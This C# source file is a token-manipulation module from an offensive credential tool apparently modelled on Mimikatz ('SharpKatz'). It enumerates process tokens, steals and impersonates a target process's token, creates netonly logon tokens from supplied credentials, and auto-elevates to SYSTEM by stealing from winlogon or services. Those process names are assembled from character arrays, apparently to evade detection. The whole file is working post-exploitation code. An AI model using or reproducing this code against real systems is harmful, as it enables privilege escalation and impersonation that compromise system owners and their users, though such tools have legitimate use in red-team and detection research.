using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    /// <summary>
    /// Token manipulation module: enumerate, steal (impersonate), make, and revert tokens.
    /// Covers token::list, token::elevate, token::revert, and sekurlsa::pth network-logon variant.
    /// </summary>
    internal static class Token
    {
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint MAXIMUM_ALLOWED = 0x02000000;

        private const int TokenImpersonation = 2;

        private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        private const int LOGON32_PROVIDER_WINNT50 = 3;

        public struct TokenInfo
        {
            public int ProcessId;
            public string ProcessName;
            public string Username;
            public string Domain;
            public string Sid;
            public bool IsElevated;
        }

        /// <summary>
        /// Enumerate unique tokens from all accessible processes.
        /// </summary>
        public static List<TokenInfo> ListTokens()
        {
            var tokens = new List<TokenInfo>();
            var seen = new HashSet<string>();

            Process[] processes = Process.GetProcesses();
            foreach (Process proc in processes)
            {
                try
                {
                    IntPtr hToken = IntPtr.Zero;
                    if (!OpenProcessToken(proc.Handle, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken))
                        continue;

                    try
                    {
                        TokenInfo info = GetTokenInfo(hToken, proc.Id, proc.ProcessName);
                        if (string.IsNullOrEmpty(info.Username)) continue;

                        string key = info.Domain + "\\" + info.Username;
                        if (!seen.Contains(key))
                        {
                            seen.Add(key);
                            tokens.Add(info);
                        }
                    }
                    finally
                    {
                        NtClose(hToken);
                    }
                }
                catch { }
            }
            return tokens;
        }

        /// <summary>
        /// Steal a token from the specified PID and impersonate on the current thread.
        /// </summary>
        public static bool StealToken(int processId)
        {
            try
            {
                Process targetProc = Process.GetProcessById(processId);
                IntPtr hToken = IntPtr.Zero;

                if (!OpenProcessToken(targetProc.Handle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, out hToken))
                {
                    Console.WriteLine("  Error: Cannot open process token for PID " + processId);
                    return false;
                }

                IntPtr hDupToken = IntPtr.Zero;
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);

                if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, ref sa,
                    (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TokenImpersonation, ref hDupToken))
                {
                    Console.WriteLine("  Error: Cannot duplicate token");
                    NtClose(hToken);
                    return false;
                }

                if (!ImpersonateLoggedOnUser(hDupToken))
                {
                    Console.WriteLine("  Error: Impersonation failed");
                    NtClose(hDupToken);
                    NtClose(hToken);
                    return false;
                }

                TokenInfo info = GetTokenInfo(hDupToken, processId, targetProc.ProcessName);
                Console.WriteLine("  Token stolen from PID {0} ({1})", processId, targetProc.ProcessName);
                Console.WriteLine("  Now impersonating: {0}\\{1}", info.Domain, info.Username);

                NtClose(hDupToken);
                NtClose(hToken);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("  Error: " + ex.Message);
                return false;
            }
        }

        /// <summary>
        /// Create a network-logon token (runas /netonly).
        /// Remote resources will use the supplied credentials.
        /// </summary>
        public static bool MakeToken(string domain, string username, string password)
        {
            IntPtr hToken = IntPtr.Zero;
            if (!LogonUser(username, domain, password,
                LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, ref hToken))
            {
                Console.WriteLine("  Error: LogonUser failed");
                return false;
            }

            if (!ImpersonateLoggedOnUser(hToken))
            {
                Console.WriteLine("  Error: Impersonation failed");
                NtClose(hToken);
                return false;
            }

            Console.WriteLine("  Token created for {0}\\{1}", domain, username);
            Console.WriteLine("  Network access will use these credentials");
            NtClose(hToken);
            return true;
        }

        /// <summary>
        /// Revert to original token.
        /// </summary>
        public static bool Revert()
        {
            if (RevertToSelf())
            {
                Console.WriteLine("  Reverted to original token");
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    Console.WriteLine("  Current identity: {0}", identity.Name);
                }
                return true;
            }
            Console.WriteLine("  Error: RevertToSelf failed");
            return false;
        }

        /// <summary>
        /// Auto-elevate to SYSTEM by stealing from a SYSTEM process.
        /// </summary>
        public static bool ElevateToSystem()
        {
            string[] targets = new string[]
            {
                new string(new char[] { 'w','i','n','l','o','g','o','n' }),
                new string(new char[] { 's','e','r','v','i','c','e','s' }),
            };

            foreach (string name in targets)
            {
                try
                {
                    Process[] procs = Process.GetProcessesByName(name);
                    if (procs.Length > 0 && StealToken(procs[0].Id))
                        return true;
                }
                catch { }
            }

            Console.WriteLine("  Error: Could not find a SYSTEM process to steal from");
            return false;
        }

        /// <summary>
        /// Extract user info from a token handle.
        /// </summary>
        private static TokenInfo GetTokenInfo(IntPtr hToken, int pid, string procName)
        {
            TokenInfo info = new TokenInfo { ProcessId = pid, ProcessName = procName };

            // Get TOKEN_USER
            uint tokenInfoLength = 0;
            GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, 0, out tokenInfoLength);

            if (tokenInfoLength == 0) return info;

            IntPtr tokenInfo = Marshal.AllocHGlobal((int)tokenInfoLength);
            try
            {
                if (!GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, tokenInfo, tokenInfoLength, out tokenInfoLength))
                    return info;

                // TOKEN_USER is { SID_AND_ATTRIBUTES { IntPtr Sid, uint Attributes } }
                IntPtr pSid = Marshal.ReadIntPtr(tokenInfo);

                // LookupAccountSid
                int nameLen = 256, domainLen = 256, peUse = 0;
                IntPtr nameBuffer = Marshal.AllocHGlobal(nameLen * 2);
                IntPtr domainBuffer = Marshal.AllocHGlobal(domainLen * 2);
                try
                {
                    if (LookupAccountSidW(IntPtr.Zero, pSid, nameBuffer, ref nameLen,
                        domainBuffer, ref domainLen, ref peUse))
                    {
                        info.Username = Marshal.PtrToStringUni(nameBuffer);
                        info.Domain = Marshal.PtrToStringUni(domainBuffer);
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(nameBuffer);
                    Marshal.FreeHGlobal(domainBuffer);
                }

                // SID string
                IntPtr sidStr = IntPtr.Zero;
                if (ConvertSidToStringSidW(pSid, ref sidStr))
                {
                    info.Sid = Marshal.PtrToStringUni(sidStr);
                    LocalFree(sidStr);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(tokenInfo);
            }

            // Check elevation (TOKEN_INFORMATION_CLASS.TokenElevation = 20)
            uint elevLen = 0;
            GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)20, IntPtr.Zero, 0, out elevLen);
            if (elevLen > 0)
            {
                IntPtr elevInfo = Marshal.AllocHGlobal((int)elevLen);
                try
                {
                    if (GetTokenInformation(hToken, (TOKEN_INFORMATION_CLASS)20, elevInfo, elevLen, out elevLen))
                        info.IsElevated = Marshal.ReadInt32(elevInfo) != 0;
                }
                finally
                {
                    Marshal.FreeHGlobal(elevInfo);
                }
            }

            return info;
        }

        private static void NtClose(IntPtr handle)
        {
            try { CloseHandle(handle); } catch { }
        }

        // P/Invoke — these are safe lookups not covered by the existing dynamic resolver
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool LookupAccountSidW(
            IntPtr lpSystemName, IntPtr Sid, IntPtr lpName, ref int cchName,
            IntPtr ReferencedDomainName, ref int cchReferencedDomainName, ref int peUse);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool ConvertSidToStringSidW(IntPtr Sid, ref IntPtr StringSid);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
    }
}
